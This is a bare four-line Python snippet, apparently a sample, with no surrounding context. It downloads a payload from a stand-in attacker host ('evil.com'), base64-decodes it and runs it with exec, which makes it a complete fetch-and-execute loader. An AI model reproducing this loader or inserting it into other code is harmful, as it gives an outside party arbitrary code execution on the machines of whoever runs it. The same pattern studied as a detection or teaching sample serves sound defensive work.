import base64
import requests
code = requests.get('http://evil.com/payload').text
exec(base64.b64decode(code))